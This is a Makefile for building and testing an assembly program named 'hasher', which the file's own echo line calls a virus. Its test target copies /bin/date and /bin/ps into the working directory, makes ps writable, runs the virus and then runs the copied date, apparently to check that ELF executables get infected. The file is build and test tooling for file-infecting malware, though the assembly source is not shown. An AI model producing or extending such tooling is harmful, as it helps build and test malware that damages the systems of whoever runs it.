   all: hasher

   test:
       -cp -f /bin/date .
       -./hasher
       -cp -f /bin/ps .
       -chmod +w ./ps
       -./date

   hasher: hasher.asm
       nasm -O2 -f elf $<
       ld hasher.o -o $@
       @echo "Virus size is `size hasher|awk '/hasher$$/{print $$1-7}'`"

   clean:
       -@rm -f hasher hasher.o date

   .PHONY: all test clean
